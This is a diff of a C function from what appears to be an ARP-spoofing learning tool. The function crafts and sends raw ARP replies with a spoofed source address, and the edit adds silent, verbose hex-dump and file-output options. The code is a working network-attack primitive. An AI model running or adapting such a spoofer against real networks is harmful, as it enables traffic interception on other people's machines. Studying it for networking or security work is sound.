@@ -24,13 +24,15 @@ int send_arp(t_malcom *data)
     sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //sockraw porque no podemos mandar packet arp con un socket normal. sockraw son paquetes crudos 
     if (sockfd < 0)
     {
-        fprintf(stderr, "Failed to create RAW socket\n");
+        if (!data->s)
+            fprintf(stderr, "Failed to create RAW socket\n");
         exit(1);
     }
     if_index = if_nametoindex(data->iface);
     if (if_index == 0)
     {
-        fprintf(stderr, "Failed to obtain index of the network interface: %s\n", data->iface);
+        if (!data->s)
+            fprintf(stderr, "Failed to obtain index of the network interface: %s\n", data->iface);
         exit(1);
     }
 
@@ -69,28 +71,36 @@ int send_arp(t_malcom *data)
     ft_memcpy(packet.arp.arp_tha, target_mac, ETH_ALEN);//target MAC
     inet_pton(AF_INET, data->t_ip, (void *)&packet.arp.arp_tpa);// target IP
 
-    printf("Now sending an ARP reply to %s with spoofed source %s, please wait...\n", data->t_ip, data->s_ip);
+    if (!data->s)
+        printf("Now sending an ARP reply to %s with spoofed source %s, please wait...\n", data->t_ip, data->s_ip);
 
-    void print_hex(const void *data, size_t size) {
-    const unsigned char *byte = (const unsigned char *)data;
-    for (size_t i = 0; i < size; i++) {
-        printf("%02x ", byte[i]); // Imprime cada byte en formato hexadecimal
-        if ((i + 1) % 16 == 0) // Salto de línea cada 16 bytes
-            printf("\n");
+    if (data->v == 1)
+    {
+        printf("Dump del paquete ARP:\n");
+        print_hex(&packet, sizeof(packet), stdout);
     }
-    printf("\n");
-}
+    else if (data->o == 1)
+    {
+        FILE *output_file = fopen(data->output, "w");
+        if (output_file == NULL)
+        {
+            if (!data->s)
+                fprintf(stderr, "Failed to open output file\n");
+            exit(1);
+        }
 
-    printf("Dump del paquete ARP antes de enviarlo:\n");
-print_hex(&packet, sizeof(packet));
-
-
+        fprintf(output_file, "Dump del paquete ARP:\n");
+        print_hex(&packet, sizeof(packet), output_file);
+    }
+    
     if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr*)&sock_addr, sizeof(sock_addr)) < 0)
     {
-        fprintf(stderr, "Failed to send ARP reply\n");
+        if (!data->s)
+            fprintf(stderr, "Failed to send ARP reply\n");
         close(sockfd);
         exit(1);
     }
-    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
+    if (!data->s)
+        printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
     return (0);
 }
